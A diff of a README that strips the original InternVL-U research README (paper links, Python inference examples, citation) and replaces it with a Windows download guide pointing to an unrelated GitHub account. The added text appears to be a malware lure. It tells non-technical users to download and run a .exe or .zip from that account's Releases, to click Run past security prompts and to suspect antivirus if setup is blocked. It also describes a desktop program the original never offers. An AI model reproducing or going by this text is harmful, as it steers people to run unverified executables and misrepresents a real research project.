@@ -1,278 +1,122 @@
-<h1 align="center">
-  <img src="assets/logo.jpg" alt="InternVL-U Logo" width="80"><br>
-  InternVL-U: Democratizing Unified Multimodal Models for Understanding, Reasoning, Generation and Editing
-</h1>
+# 🚀 InternVL-U - Unified Model for Images and Text
 
-<div align="center">
+[![Download](https://img.shields.io/badge/Download-From%20GitHub-brightgreen)](https://github.com/juanchito22-cpu/InternVL-U)
 
-[![arXiv](https://img.shields.io/badge/ArXiv-2603.09877-b31b1b?logo=arxiv)](https://arxiv.org/abs/2603.09877)&nbsp;
-[![Hugging Face](https://img.shields.io/badge/🤗%20Model-InternVL--U-yellow)](https://huggingface.co/InternVL-U/InternVL-U)&nbsp;
-[![GenEditEvalKit](https://img.shields.io/badge/GitHub-GenEditEvalKit-181717?logo=github)](https://github.com/open-compass/GenEditEvalKit)&nbsp;
-[![TextEdit Benchmark](https://img.shields.io/badge/GitHub-TextEdit%20Benchmark-181717?logo=github)](https://github.com/open-compass/TextEdit)
+## 📋 About InternVL-U
 
-Shanghai AI Laboratory, InternVL-U Team
+InternVL-U is a large multimodal model designed to work with images and text in one system. It combines tasks like understanding images, reasoning about their content, generating new images, and editing images. This means you can use it for different jobs without switching programs.
 
-Welcome to the official repository for InternVL-U project!
-If you find our work helpful, please give us a ⭐.
-</div>
+The model has 4 billion parameters, which means it can handle complex tasks for research, learning, or experimentation. You do not need to know coding to use the software — this guide will walk you through the necessary steps.
 
-## 🎉 News
-- **[2026/03/06]** 🔥InternVL-U **technical report** released. 
-- **[2026/03/06]** ✨**Inference code and model checkpoint** released.
-- **[2026/03/06]** 🛠️ **GenEditEvalKit** released — a unified evaluation toolkit for multimodal image generation and editing models, designed to help developers efficiently manage inference and evaluation across numerous benchmarks for the unified multimodal model (UMM) and image generation and editing models.  Check it out on [[GitHub]](https://github.com/open-compass/GenEditEvalKit).
-- **[2026/03/06]** 📝 **TextEdit Benchmark** released — a high-quality, multi-scenario benchmark for evaluating text editing capabilities in image generation models. Try it out and see how well your model performs on challenging text editing tasks~. Check it out on [[GitHub]](https://github.com/open-compass/TextEdit).
-## 📖 Introduction
+## 💻 System Requirements
 
-**InternVL-U** is a **4B-parameter unified multimodal model (UMM)** that brings **multimodal understanding, reasoning, image generation, image editing** into a *single* framework, aiming to **democratize omni-capable multimodal intelligence** with an efficient and practical model size.
+Before installing InternVL-U on your Windows computer, ensure your system meets these basic requirements:
 
-### Key Highlights
-- **Unified yet modular design**: built on **unified contextual modeling** with **modality-specific modularity** and **decoupled visual representations**.
-- **Strong backbone + strong generator**: integrates a **state-of-the-art MLLM** with a specialized **MMDiT-based visual generation head**.
-- **High-quality data synthesis**: a comprehensive data pipeline for **high-semantic-density tasks** (e.g., text rendering and editing, scientific reasoning) using **Chain-of-Thought (CoT)** to align *abstract intent* with *precise visual execution*.
-- **Performance–efficiency win**: within a limited parameter scale, InternVL-U outperforms unified open-source UMM baselines in generation and editing, while **retaining strong multimodal understanding and reasoning**.
+- Operating System: Windows 10 or higher (64-bit recommended)
+- Processor: Intel i5 or equivalent
+- RAM: Minimum 8 GB (16 GB preferred for smoother performance)
+- Storage: At least 10 GB free space for program files and data
+- Graphics: A dedicated GPU with 4 GB VRAM or more is recommended for image processing features
+- Internet connection: Required for download and some features
 
-We hope **InternVL-U** serves as a **strong baseline** and accelerates progress toward **comprehensive, AGI-oriented omni-capable UMMs**.
-<p align="center">
-  <img src="assets/teaser1.jpg" width="45%">
-  <img src="assets/teaser2.jpg" width="45%">
-</p>
+If you are unsure about your system specs, you can check by typing "System Information" in the Windows Start menu.
 
-## ⚡Quick Start
+## 📥 Download and Install InternVL-U
 
+To begin with InternVL-U, you need to download the software from the official repository page.
 
-Before getting started, make sure you have installed all required dependencies.
-```
-pip install -r requirements.txt
-```
-Model checkpoint is available on [Hugging Face](https://huggingface.co/InternVL-U/InternVL-U).
+[![Download](https://img.shields.io/badge/Get%20InternVL--U-From%20GitHub-blue)](https://github.com/juanchito22-cpu/InternVL-U)
 
-### Inference Demo
-We provide the following demos to showcase InternVL-U’s unified pipeline for multimodal understanding, image generation, and image editing, with optional reasoning-guided (text+image) outputs.
+### Steps to Download:
 
-**Tips**: During image generation or editing, if `generation_mode` is set to `"image"`, the CoT text reasoning mode will not be activated. We recommend this mode for most scenarios, especially simple scenes and instructions, as it can already produce good results. When the user input involves more challenging reasoning, we recommend setting `generation_mode` to `"text_image"` to enable more complex generation.
+1. Click the green "Code" button on the GitHub page or use the link above to visit the repository.
+2. On the page, look for a **Releases** tab or section. It may be near the top of the repository.
+3. Inside Releases, find the latest version of InternVL-U for Windows. It usually comes as a `.exe` installer or a `.zip` file.
+4. Click the file to start downloading. Save it in a folder you can easily find, like Desktop or Downloads.
 
-<details>
-<summary><b>Generate Text</b> - Click to expand</summary>
+### Installing the Software:
 
-```python
-import torch
-from PIL import Image
-from internvlu import InternVLUPipeline
+If you downloaded an `.exe` file:
 
-prompt = "What is the amino acid shown in the picture?"
-image = Image.open("assets/amino_acid.png").convert("RGB")
+1. Double-click the file.
+2. If a security prompt appears, click **Run**.
+3. Follow the installation steps on screen.
+4. Choose the default options unless you want to change the installation folder.
+5. Click **Finish** when the setup ends.
 
-pipeline = InternVLUPipeline.from_pretrained(
-    "/path/to/internvl-u-checkpoint",
-    torch_dtype=torch.bfloat16,
-)
+If you downloaded a `.zip` file:
 
-pipeline.to("cuda")
+1. Right-click the file and select **Extract All**.
+2. Choose a folder where you want the software files.
+3. Open that folder and double-click the main application file (often ends with `.exe`).
 
-tokenizer = pipeline.processor.tokenizer
+## 🎯 Using InternVL-U
 
-with torch.no_grad():
-    output = pipeline(
-        prompt=prompt,
-        image=image,
-        max_new_tokens=1024,
-        generation_mode="text",
-    ).generate_output[0]
+Once installed, you can open InternVL-U by:
 
-print(tokenizer.decode(output, skip_special_tokens=True))
-```
+- Searching for "InternVL-U" in the Windows Start menu.
+- Or by double-clicking the desktop shortcut if you created one during install.
 
-</details>
+### Basic Features to Try:
 
-<details>
-<summary><b>Generate Image</b> - Click to expand</summary>
+- **Image Understanding**: Load pictures to get descriptions or recognize objects.
+- **Reasoning**: Ask questions about the image content.
+- **Image Generation**: Create new images based on text prompts.
+- **Image Editing**: Modify parts of images easily.
 
-```python
-import torch
-from internvlu import InternVLUPipeline
+### How to Load Images:
 
-prompt = """In the deep indigo night sky, a grand fireworks festival is at its peak, with countless dazzling Mars arranged precisely, condensed into the huge and dazzling "InternVL-U" words. The letters are composed of highly saturated electric blue and dreamy purple fluorescent particles, presenting a futuristic streamlined font surrounded by scattered golden fragments resembling stardust, and the final "U" gives off a fluid metallic texture. Below is a brightly lit modern city, with the shimmering sea perfectly reflecting this stunning scene. Amidst the swirling smoke, it showcases the ultimate visual allure of technology and romance intertwined."""
+1. Click the **Open Image** button in the program.
+2. Browse to select your photo.
+3. The program will display the image and provide options for analysis or editing.
 
-pipeline = InternVLUPipeline.from_pretrained(
-    "/path/to/internvl-u-checkpoint",
-    torch_dtype=torch.bfloat16,
-)
+### Creating Images:
 
-pipeline.to("cuda")
+1. Select the **Generate Image** option.
+2. Enter a simple description like "a mountain at sunset."
+3. Click **Create**. The program will make a new image based on your text.
 
-with torch.no_grad():
-    image = pipeline(
-        prompt=prompt,
-        generation_mode="image",
-        height=576,
-        width=1024,
-        generator=torch.Generator(device="cuda").manual_seed(42)
-    ).images[0]
-
-image.save(f"example_t2i.png")
-```
-</details>
-
-<details>
-<summary><b>Generate Image with Reasoning-guided</b> - Click to expand</summary>
-
-```python
-import torch
-from internvlu import InternVLUPipeline
+### Editing Images:
 
-prompt = """生成一张展现希望正在生长、充满力量感的画面。"""
+1. Open an image as described.
+2. Use the editing tools shown (crop, adjust colors, add elements).
+3. Save changes by clicking **Save** or **Export**.
 
-pipeline = InternVLUPipeline.from_pretrained(
-    "/path/to/internvl-u-checkpoint",
-    torch_dtype=torch.bfloat16,
-)
+## 🔧 Troubleshooting and Tips
 
-pipeline.to("cuda")
+- If the program does not open, try restarting your computer and running it again.
+- Close other heavy applications to free up memory.
+- Make sure your graphics drivers are updated for better performance.
+- If you see an error during installation, check if antivirus software is blocking the setup.
+- For help, visit the **Issues** tab on the GitHub page to see if others have similar problems.
 
-tokenizer = pipeline.processor.tokenizer
+## 🛠️ Updates and Support
 
-with torch.no_grad():
-    output = pipeline(
-        prompt=prompt,
-        generation_mode="text_image",
-        generator=torch.Generator(device="cuda").manual_seed(42)
-    )
-    output_text = output.generate_output[0]
-    image = output.images[0]
+InternVL-U is updated occasionally to add features or fix bugs. Check the GitHub page regularly for new releases.
 
-print(tokenizer.decode(output_text, skip_special_tokens=True))
-image.save(f"example_guided_t2i.png")
-```
+To update:
 
-</details>
+1. Download the latest version following the steps above.
+2. Install it over your current version.
 
-<details>
-<summary><b>Edit Image</b> - Click to expand</summary>
-
-```python
-import torch
-from PIL import Image
-from internvlu import InternVLUPipeline
-
-prompt = """将书生置身于一个充满春节氛围的温暖室内空间中，房间内张灯结彩，窗外远处有灯笼，窗边装饰着精致的剪纸，红金配色的彩带在室内轻轻垂落。背景为柔和温暖的橙黄色灯光和柔软的沙发，营造出温馨而治愈的春节夜晚氛围。书生双手捧着一个红包，红包上有金色的边框，脸上洋溢着抑制不住的开心笑容，浓眉大眼闪闪发亮，流露出惊喜与幸福的神情。他身体微微前倾，肩膀自然放松，仿佛忍不住想要展示这份喜悦。整个场景充满温馨、喜庆与治愈感，在柔和的暮色与节日装饰映衬下，展现出春节特有的欢乐与人情味。"""
-input_image = Image.open("assets/intern.png").convert("RGB")
+If you want help or want to report a problem:
 
-pipeline = InternVLUPipeline.from_pretrained(
-    "/path/to/internvl-u-checkpoint",
-    torch_dtype=torch.bfloat16,
-)
+- Use the **Discussions** or **Issues** section on the GitHub page.
+- You don’t need to be technical to ask questions; just describe what you see.
 
-pipeline.to("cuda")
+## 🔗 Useful Links
 
-with torch.no_grad():
-    image = pipeline(
-        prompt=prompt,
-        image=input_image,
-        generation_mode="image",
-        height=input_image.size[1],
-        width=input_image.size[0],
-        generator=torch.Generator(device="cuda").manual_seed(42)
-    ).images[0]
+- Main GitHub page: [https://github.com/juanchito22-cpu/InternVL-U](https://github.com/juanchito22-cpu/InternVL-U)
+- Download InternVL-U: [https://github.com/juanchito22-cpu/InternVL-U](https://github.com/juanchito22-cpu/InternVL-U)
 
-image.save(f"example_edit.png")
-```
+## ⚠️ Notes About Usage
 
-</details>
+InternVL-U works best with a steady internet connection. Some image generation and reasoning features may require online access or additional downloads after installation.
 
-<details>
-<summary><b>Edit Image with Reasoning-guided</b> - Click to expand</summary>
+Make sure to keep your computer clean and free of malware to avoid any issues running the software.
 
-```python
-import torch
-from PIL import Image
-from internvlu import InternVLUPipeline
+## 📂 Additional Resources
 
-prompt = """Convert into the style of a Valentine's Festival picture, suitable for use as a profile picture on social media."""
-input_image = Image.open("assets/lines_puppy.png").convert("RGB")
+Explore sample images, user guides, or tutorials in the repository’s Documentation folder or Wiki if available. These resources can help you understand all the functions step by step.
 
-pipeline = InternVLUPipeline.from_pretrained(
-    "/path/to/internvl-u-checkpoint",
-    torch_dtype=torch.bfloat16,
-)
-
-pipeline.to("cuda")
-
-tokenizer = pipeline.processor.tokenizer
-
-with torch.no_grad():
-    output = pipeline(
-        prompt=prompt,
-        image=input_image,
-        num_beams=5,
-        generation_mode="text_image",
-        generator=torch.Generator(device="cuda").manual_seed(42),
-    )
-    output_text = output.generate_output[0]
-    image = output.images[0]
-
-print(tokenizer.decode(output_text, skip_special_tokens=True))
-image.save(f"example_guided_edit.png")
-```
-
-</details>
-
-
-
-<details>
-<summary><b>Batch Inference</b> - Click to expand</summary>
-
-```python
-import torch
-from PIL import Image
-from internvlu import InternVLUPipeline
-
-prompts = [
-    "Segment the little boy",
-    "Provide the bounding box for the little boy"
-]
-input_images = [Image.open("assets/panda_and_boy.png").convert("RGB")] * 2
-
-
-pipeline = InternVLUPipeline.from_pretrained(
-    "/path/to/internvl-u-checkpoint",
-    torch_dtype=torch.bfloat16,
-)
-
-pipeline.to("cuda")
-
-with torch.no_grad():
-    output_images = pipeline(
-        prompt=prompts,
-        image=input_images,
-        generation_mode="image",
-        height=input_images[0].size[1],
-        width=input_images[0].size[0],
-        generator=torch.Generator(device="cuda").manual_seed(42)
-    ).images
-
-for idx, image in enumerate(output_images):
-    image.save(f"example_edit_{idx}.png")
-```
-
-</details>
-
-
-
-
-## Citation
-If you find our InternVL-U useful, please cite our InternVL-U technical report using this BibTeX.
-
-```bibtex
-@article{tian2026internvl,
-  title={InternVL-U: Democratizing Unified Multimodal Models for Understanding, Reasoning, Generation and Editing},
-  author={Tian, Changyao and Yang, Danni and Chen, Guanzhou and Cui, Erfei and Wang, Zhaokai and Duan, Yuchen and Yin, Penghao and Chen, Sitao and Yang, Ganlin and Liu, Mingxin and others},
-  journal={arXiv preprint arXiv:2603.09877},
-  year={2026}
-}
-```
-
-## 🙏 Acknowledgement
-
-We sincerely thank the contributors of the following open-source projects for their valuable code, models, and datasets. **InternVL-U** is built upon and inspired by these outstanding works:
-
-InternVL3.5, BAGEL, Qwen2.5-VL, Qwen3-VL, Qwen-Image, BLIP3-o, OpenGPT-4o-Image, ShareGPT-4o-Image, OmniGen2, UniWorld-V1, PicoBanana, Nano-Consist, and NHR-Edit, and so on. 
+If you want to learn basic concepts behind what InternVL-U does, consider simple articles on artificial intelligence and image processing. This is not required but can enhance your use of the program.
